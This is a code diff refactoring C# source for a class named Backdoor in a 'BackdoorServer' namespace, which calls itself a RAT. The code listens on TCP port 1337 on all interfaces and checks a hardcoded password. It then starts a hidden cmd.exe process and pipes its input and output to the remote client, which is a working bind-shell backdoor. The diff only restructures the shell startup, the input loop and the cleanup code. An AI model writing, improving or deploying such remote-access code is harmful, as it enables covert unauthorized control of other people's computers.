@@ -23,6 +23,7 @@ namespace BackdoorServer
         StreamWriter toShell;
         StreamReader inStream;
         StreamWriter outStream;
+        // reading and sending shell output to the client
         Thread shellThread;
 
         public Backdoor(int port = 1337, string serverName = "RAT", string password = "P455wD", bool verbose = true)
@@ -37,9 +38,6 @@ namespace BackdoorServer
         {
             try
             {
-                Console.InputEncoding = Encoding.ASCII;
-                Console.OutputEncoding = Encoding.ASCII;
-
                 if (verbose) Console.WriteLine("Listening on port " + port);
 
                 listener = new TcpListener(IPAddress.Any, port);
@@ -66,29 +64,7 @@ namespace BackdoorServer
 
                 if (verbose) Console.WriteLine("Password Accepted.");
 
-                shell = new Process();
-                ProcessStartInfo p = new ProcessStartInfo("cmd");
-                p.CreateNoWindow = true;
-                p.UseShellExecute = false;
-                p.RedirectStandardError = true;
-                p.RedirectStandardInput = true;
-                p.RedirectStandardOutput = true;
-                shell.StartInfo = p;
-                shell.Start();
-
-                toShell = shell.StandardInput;
-                fromShell = shell.StandardOutput;
-                toShell.AutoFlush = true;
-
-                // thread for reading output from the shell
-                shellThread = new Thread(new ThreadStart(SendShellOutput));
-                shellThread.Start();
-
-                outStream.WriteLine(AlignCenter("  Welcome to " + serverName + " RAT  ", 80, '='));
-                outStream.WriteLine(AlignCenter("  SINGLE-USER MODE  ", 80, '='));
-                outStream.WriteLine("Starting shell...\n");
-
-                ReceiveInput();
+                StartShell();
             }
             catch (Exception e)
             {
@@ -99,6 +75,34 @@ namespace BackdoorServer
             {
                 CloseShell();
             }
+        }
+        void StartShell()
+        {
+            shell = new Process();
+            ProcessStartInfo p = new ProcessStartInfo("cmd")
+            {
+                CreateNoWindow = true,
+                UseShellExecute = false,
+                RedirectStandardError = true,
+                RedirectStandardInput = true,
+                RedirectStandardOutput = true
+            };
+            shell.StartInfo = p;
+            shell.Start();
+
+            toShell = shell.StandardInput;
+            fromShell = shell.StandardOutput;
+            toShell.AutoFlush = true;
+
+            // start sending output to the user
+            shellThread = new Thread(new ThreadStart(SendShellOutput));
+            shellThread.Start();
+
+            // welcome message
+            outStream.WriteLine(AlignCenter("  Welcome to " + serverName + " RAT  ", 80, '='));
+            outStream.WriteLine(AlignCenter("  SINGLE-USER MODE  ", 80, '='));
+
+            InputLoop();
         }
 
         void SendShellOutput()
@@ -116,7 +120,7 @@ namespace BackdoorServer
             CloseShell();
         }
 
-        void ReceiveInput()
+        void InputLoop()
         {
             string tempBuff = "";
             while (((tempBuff = inStream.ReadLine()) != null))
@@ -209,10 +213,16 @@ namespace BackdoorServer
             try
             {
                 if (verbose) Console.WriteLine("Closing shell process");
-                shell.Close();
-                shell.Dispose();
-                shellThread.Abort();
-                shellThread = null;
+                if (shell != null)
+                {
+                    shell.Close();
+                    shell.Dispose();
+                }
+                if (shellThread != null)
+                {
+                    shellThread.Abort();
+                    shellThread = null;
+                }
                 toShell.Dispose();
                 fromShell.Dispose();
                 shell.Dispose();
